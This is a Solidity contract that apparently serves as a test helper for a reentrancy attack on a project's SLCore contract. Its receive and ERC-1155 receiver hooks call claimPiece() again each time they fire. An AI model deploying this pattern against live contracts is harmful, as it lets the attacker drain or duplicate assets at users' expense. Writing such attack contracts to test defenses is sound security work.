// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SLCore.sol";
import "./ISLCore.sol";
import "./IInvestment.sol";
import "./IPaymentToken.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackSLCoreClaimPiece {
    ISLCore public slCore;
    IInvestment public investment;

    constructor(
        address _slCoreAddress,
        address paymentToken,
        address investmentAddress,
        address spender,
        uint256 amount
    ) {
        slCore = ISLCore(_slCoreAddress);
        investment = IInvestment(investmentAddress);
        mintERC20(paymentToken, 5_000_000_000);
        approveERC20(paymentToken, spender, amount);
        approveERC20(paymentToken, investmentAddress, 5_000_000_000);
        slCore.mintEntry();
        investment.invest(5_000, 0);
    }

    // Fallback function to repeatedly call the victim contract
    receive() external payable {
        slCore.claimPiece();
    }

    // Function to initiate the attack
    function startAttack() public {
        slCore.claimPiece();
    }

    function approveERC20(
        address paymentToken,
        address spender,
        uint256 amount
    ) public {
        IERC20(paymentToken).approve(spender, amount);
    }

    function mintERC20(address paymentToken, uint256 amount) public {
        IPaymentToken(paymentToken).mint(amount);
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public virtual returns (bytes4) {
        slCore.claimPiece();

        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) public virtual returns (bytes4) {
        slCore.claimPiece();
        return this.onERC1155BatchReceived.selector;
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public virtual returns (bytes4) {
        return this.onERC721Received.selector;
    }
}